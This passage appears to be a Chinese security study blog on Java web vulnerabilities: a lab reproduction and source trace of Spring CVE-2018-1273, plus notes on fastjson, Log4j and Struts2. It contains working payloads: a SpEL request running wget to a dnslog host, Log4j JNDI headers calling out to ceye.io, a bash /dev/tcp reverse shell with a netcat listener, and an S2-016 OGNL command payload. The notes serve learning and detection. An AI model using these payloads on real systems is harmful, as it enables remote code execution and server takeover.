<h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd ./vulhub/spring/CVE-2018-1273</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h4 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h4><ul>
<li>打开<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/users%EF%BC%8C%E9%9A%8F%E4%BE%BF%E5%86%99%E7%82%B9%E4%BB%80%E4%B9%88%EF%BC%8C%E5%8F%91%E9%80%81">http://127.0.0.1:8080/users，随便写点什么，发送</a><br><img src="/photo/04ac4c397f79ea3d3dcfd932d049aa5d_889x585.png" alt="img"></li>
<li>抓包，发送payload</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:8080/users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 134</span><br><span class="line">Origin: http://127.0.0.1:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:8080/users</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;wget http://z0w11n.dnslog.cn&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>

<p><img src="/photo/159793f3fadad434c46aeafd7a4ac981_842x249.png" alt="img"></p>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><ul>
<li>漏洞触发点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException &#123;</span><br><span class="line">            if (!this.isWritableProperty(propertyName)) &#123;</span><br><span class="line">                throw new NotWritablePropertyException(this.type, propertyName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">                context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));</span><br><span class="line">                context.setTypeConverter(new StandardTypeConverter(this.conversionService));</span><br><span class="line">                context.setTypeLocator((typeName) -&gt; &#123;</span><br><span class="line">                    throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, new Object[]&#123;typeName&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">                context.setRootObject(this.map);</span><br><span class="line">                Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">                PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">                TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">                TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line">                propertyType = propertyName.endsWith(&quot;]&quot;) ? propertyType.getActualType() : propertyType;</span><br><span class="line">                if (propertyType != null &amp;&amp; this.conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">                    if (descriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t find PropertyDescriptor for %s on %s!&quot;, leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);</span><br><span class="line">                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);</span><br><span class="line">                    if (typeDescriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t obtain type descriptor for method parameter %s!&quot;, methodParameter));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                try &#123;</span><br><span class="line">                    expression.setValue(context, value);</span><br><span class="line">                &#125; catch (SpelEvaluationException var11) &#123;</span><br><span class="line">                    throw new NotWritablePropertyException(this.type, propertyName, &quot;Could not write property!&quot;, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>为什么会跑到这呢，先要了解一下HandlerMethod类，HandlerMethod及子类主要用于封装方法调用相关信息,子类还提供调用,参数准备和返回值处理的职责。</p>
<ul>
<li>HandlerMethod 封装方法定义相关的信息,如类,方法,参数等.</li>
<li>使用场景:HandlerMapping时会使用</li>
<li>InvocableHandlerMethod 添加参数准备,方法调用功能</li>
<li>使用场景:执行使用@ModelAttribute注解会使用</li>
<li>ServletInvocableHandlerMethod 添加返回值处理职责,ResponseStatus处理<br>使用场景:执行http相关方法会使用,比如调用处理执行</li>
</ul>
<p>从路由入口可以知道，users使用了ModelAttribute注解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&#123;&quot;/users&quot;&#125;)</span><br><span class="line">class UserController &#123;</span><br><span class="line">    private final UserManagement userManagement;</span><br><span class="line"></span><br><span class="line">    @ModelAttribute(&quot;users&quot;)</span><br><span class="line">    public Page&lt;User&gt; users(@PageableDefault(size = 5) Pageable pageable) &#123;</span><br><span class="line">        return this.userManagement.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(</span><br><span class="line">        method = &#123;RequestMethod.POST&#125;</span><br><span class="line">    )</span><br><span class="line">    public Object register(UserController.UserForm userForm, BindingResult binding, Model model) &#123;</span><br><span class="line">        userForm.validate(binding, this.userManagement);</span><br><span class="line">        if (binding.hasErrors()) &#123;</span><br><span class="line">            return &quot;users&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.userManagement.register(new Username(userForm.getUsername()), Password.raw(userForm.getPassword()));</span><br><span class="line">            RedirectView redirectView = new RedirectView(&quot;redirect:/users&quot;);</span><br><span class="line">            redirectView.setPropagateQueryParams(true);</span><br><span class="line">            return redirectView;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>当访问上面路由的时候触发了下面org.springframework.web.method.support.InvocableHandlerMethod#getMethodArgumentValues</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">private Object[] getMethodArgumentValues(NativeWebRequest request, @Nullable ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception &#123;</span><br><span class="line">        MethodParameter[] parameters = this.getMethodParameters();</span><br><span class="line">        Object[] args = new Object[parameters.length];</span><br><span class="line"></span><br><span class="line">        for(int i = 0; i &lt; parameters.length; ++i) &#123;</span><br><span class="line">            MethodParameter parameter = parameters[i];</span><br><span class="line">            parameter.initParameterNameDiscovery(this.parameterNameDiscoverer);</span><br><span class="line">            args[i] = this.resolveProvidedArgument(parameter, providedArgs);</span><br><span class="line">            if (args[i] == null) &#123;</span><br><span class="line">                if (this.argumentResolvers.supportsParameter(parameter)) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        args[i] = this.argumentResolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);</span><br><span class="line">                    &#125; catch (Exception var9) &#123;</span><br><span class="line">                        if (this.logger.isDebugEnabled()) &#123;</span><br><span class="line">                            this.logger.debug(this.getArgumentResolutionErrorMessage(&quot;Failed to resolve&quot;, i), var9);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        throw var9;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else if (args[i] == null) &#123;</span><br><span class="line">                    throw new IllegalStateException(&quot;Could not resolve method parameter at index &quot; + parameter.getParameterIndex() + &quot; in &quot; + parameter.getExecutable().toGenericString() + &quot;: &quot; + this.getArgumentResolutionErrorMessage(&quot;No suitable resolver for&quot;, i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进org.springframework.web.method.support.HandlerMethodArgumentResolverComposite#resolveArgument</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123;</span><br><span class="line">        HandlerMethodArgumentResolver resolver = this.getArgumentResolver(parameter);</span><br><span class="line">        if (resolver == null) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Unknown parameter type [&quot; + parameter.getParameterType().getName() + &quot;]&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后进入org.springframework.web.method.annotation.ModelAttributeMethodProcessor#resolveArgument</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> public final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123;</span><br><span class="line">     Assert.state(mavContainer != null, &quot;ModelAttributeMethodProcessor requires ModelAndViewContainer&quot;);</span><br><span class="line">     Assert.state(binderFactory != null, &quot;ModelAttributeMethodProcessor requires WebDataBinderFactory&quot;);</span><br><span class="line">     String name = ModelFactory.getNameForParameter(parameter);</span><br><span class="line">     ModelAttribute ann = (ModelAttribute)parameter.getParameterAnnotation(ModelAttribute.class);</span><br><span class="line">     if (ann != null) &#123;</span><br><span class="line">         mavContainer.setBinding(name, ann.binding());</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Object attribute = null;</span><br><span class="line">     BindingResult bindingResult = null;</span><br><span class="line">     if (mavContainer.containsAttribute(name)) &#123;</span><br><span class="line">         attribute = mavContainer.getModel().get(name);</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         try &#123;</span><br><span class="line">             attribute = this.createAttribute(name, parameter, binderFactory, webRequest);</span><br><span class="line">         &#125; catch (BindException var10) &#123;</span><br><span class="line">             if (this.isBindExceptionRequired(parameter)) &#123;</span><br><span class="line">                 throw var10;</span><br><span class="line">             &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进org.springframework.data.web.ProxyingHandlerMethodArgumentResolver#createAttribute</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception &#123;</span><br><span class="line">        MapDataBinder binder = new MapDataBinder(parameter.getParameterType(), (ConversionService)this.conversionService.getObject());</span><br><span class="line">        binder.bind(new MutablePropertyValues(request.getParameterMap()));</span><br><span class="line">        return this.proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进org.springframework.validation.DataBinder#bind和dobind</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void bind(PropertyValues pvs) &#123;</span><br><span class="line">        MutablePropertyValues mpvs = pvs instanceof MutablePropertyValues ? (MutablePropertyValues)pvs : new MutablePropertyValues(pvs);</span><br><span class="line">        this.doBind(mpvs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void doBind(MutablePropertyValues mpvs) &#123;</span><br><span class="line">        this.checkAllowedFields(mpvs);</span><br><span class="line">        this.checkRequiredFields(mpvs);</span><br><span class="line">        this.applyPropertyValues(mpvs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进org.springframework.validation.DataBinder#applyPropertyValues</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected void applyPropertyValues(MutablePropertyValues mpvs) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        this.getPropertyAccessor().setPropertyValues(mpvs, this.isIgnoreUnknownFields(), this.isIgnoreInvalidFields());</span><br><span class="line">    &#125; catch (PropertyBatchUpdateException var7) &#123;</span><br><span class="line">        PropertyAccessException[] var3 = var7.getPropertyAccessExceptions();</span><br><span class="line">        int var4 = var3.length;</span><br><span class="line"></span><br><span class="line">        for(int var5 = 0; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            PropertyAccessException pae = var3[var5];</span><br><span class="line">            this.getBindingErrorProcessor().processPropertyAccessException(pae, this.getInternalBindingResult());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进org.springframework.beans.AbstractPropertyAccessor#setPropertyValues</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid) throws BeansException &#123;</span><br><span class="line">        List&lt;PropertyAccessException&gt; propertyAccessExceptions = null;</span><br><span class="line">        List&lt;PropertyValue&gt; propertyValues = pvs instanceof MutablePropertyValues ? ((MutablePropertyValues)pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues());</span><br><span class="line">        Iterator var6 = propertyValues.iterator();</span><br><span class="line"></span><br><span class="line">        while(var6.hasNext()) &#123;</span><br><span class="line">            PropertyValue pv = (PropertyValue)var6.next();</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                this.setPropertyValue(pv);</span><br><span class="line">            &#125; catch (NotWritablePropertyException var9) &#123;</span><br><span class="line">                if (!ignoreUnknown) &#123;</span><br><span class="line">                    throw var9;</span><br><span class="line">                &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进org.springframework.beans.AbstractPropertyAccessor#setPropertyValue(org.springframework.beans.PropertyValue)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void setPropertyValue(PropertyValue pv) throws BeansException &#123;</span><br><span class="line">    this.setPropertyValue(pv.getName(), pv.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>最后就进入了前文提到的漏洞触发函数org.springframework.data.web.MapDataBinder.MapPropertyAccessor#setPropertyValue</li>
</ul>
<h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>跟第一个漏洞一样，将StandardEvaluationContext替换成了SimpleEvaluationContext</p>
<p><img src="/photo/image-20240609234919193.png" alt="image-20240609234919193"></p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>判断：</p>
<p>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断。</p>
<p>原理：</p>
<p>fastjson是阿里巴巴开发的一款将json字符串和java对象进行序列化和反序列化的开源json解析库。fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题。</p>
<p>无回显怎么办：</p>
<p>1.一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</p>
<p>2.通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</p>
<p>3.直接将命令执行结果回显到请求Poc的HTTP响应中</p>
<p>@type 指定类<br>使用<code>JSON.parse</code>方法反序列化会调用此类的set方法<br>使用<code>JSON.parseObject</code>方法反序列化会调用此类get和set方法<br>可以写一个恶意类，然后通过这一特性实现命令执行</p>
<p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是bytecodes，有部分函数会根据这个bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
<h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><p>检查方式：</p>
<p>1.pom检查</p>
<p>2.可以通过日志中是否存在”jndi:ladp:&#x2F;&#x2F;“、”jndi:rmi:&#x2F;&#x2F;“，”dnslog.cn”，等字符来看看有没有别人在搞你</p>
<p>3.检查日志中是否有相关堆栈报错，堆栈中是否有一些JndiLookup,LdapURLContext等与JNDI调用相关的堆栈信息。</p>
<p>log4j 是 javaweb 的日志组件，用来记录 web 日志，该漏洞主要是由于日志在打印时当遇到${后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞特征：${jndi：rmi</p>
<p>去指定下载文件的 url 在搜索框或者搜索的 url 里面，加上 ${jndi:ldap:&#x2F;&#x2F;127.0.0.1&#x2F;test} ，log4j 会对这串代码进行表达式解析，给 lookup 传递一个恶意的参数指定，参数指的是比如 ldap 不存在的资源 $ 是会被直接执行的。后面再去指定下载文件的 url，去下载我们的恶意文件。比如是 x.class 下载完成后，并且会执行代码块</p>
<p>修复：升级 Log4j 到最新版本，根据业务判断是否关闭 lookup</p>
<p>Apache Log4j2中存在JNDI注入漏洞，主要原理是利用log4j2的日志输出jndi远程对象时,调用远程对象没做检查导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入点，迫使服 务器远程加载和修改配置的前提下使目标系统通过JNDI远程获取数据库源，触发攻击者的恶意代码。</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../pwn/photo/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAY3NkX2N0,size_20,color_FFFFFF,t_70,g_se,x_16%2523pic_center.webp" alt="在这里插入图片描述"></p>
<p>验证过程：</p>
<p>按照以上的思路，首先要在远程服务器上准备ldap或rmi服务，这里我们利用现成的工具，【JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar】，github上已有大神准备好了，这个jar包的作用是在服务器上开启ldap和rmi服务，并且可以自定义要执行的代码。命令执行格式如下：</p>
<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “payload” -A “serverip”<br>1<br>A参数为远程服务器的IP，我们只需要关注payload，将他变为要执行的代码即可。这里我们直接反弹一个shell，payload为<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;serverip&#x2F;port 0&gt;&amp;1,因为其中含有&amp;等特需符号，为防止执行不成功，换一种写法，变形为，bash -c {echo,base64_encoded_payload}|{base64,-d}|{bash,-i},本质上和前面是一样的，只不过是将前面的payload先base64编码后再解码。<br>执行后，输出如下：<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-WuxiAheR-1644768636746)(vx_images&#x2F;87154923231691.png)]<br>以上分别在1099端口和1389端口，开启了rmi，ldap的监听服务，等待jndi的连接。同时我们也再9999端口，开启一个反弹监听端口，等待反弹shell上线。</p>
<p>nc -lvvp 9999</p>
<h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><h4 id="s2-045"><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h4><p>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<p>Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。</p>
<p><strong>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</strong></p>
<h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><p>在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell。其中的jakarta解析器是Struts 2框架的标准组成部分。默认情况下jakarta是启用的，所以该漏洞的严重性需要得到正视。</p>
<p>恶意访问者可通过远程命令注入执行，令系统执行恶意命令，导致被黑客入侵，从而威胁服务器安全，影响极大。</p>
<h5 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h5><p>1、poyload存放在请求头的content-type中，正常content-type是代表的类型<br>2、content-type会显得非常长、会有一些java命令<br>3、有回显的</p>
<h4 id="s2-057"><a href="#s2-057" class="headerlink" title="s2-057"></a>s2-057</h4><p>S2-057漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令执行。</p>
<p>S2-057 先决条件 :<br>alwaysSelectFullNamespace 正确 - 操作元素未设置名称空间属性，或使用了通配符用户将从 uri 传递命名空间，并将其解析为 OGNL 表达式，最终导致远程代码执行漏洞</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击</p>
<p>原理是向Struts Action Post 注入数据</p>
<p>特征:文件名为:.do,.action,Struts</p>
<h4 id="s2-016"><a href="#s2-016" class="headerlink" title="s2-016"></a>s2-016</h4><p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调，所以，</p>
<p>访问<code>http://your-ip:8080/index.action?redirect:OGNL表达式</code>即可执行OGNL表达式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure>

<h4 id="s2-001"><a href="#s2-001" class="headerlink" title="s2-001"></a>s2-001</h4><p>该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。</p>
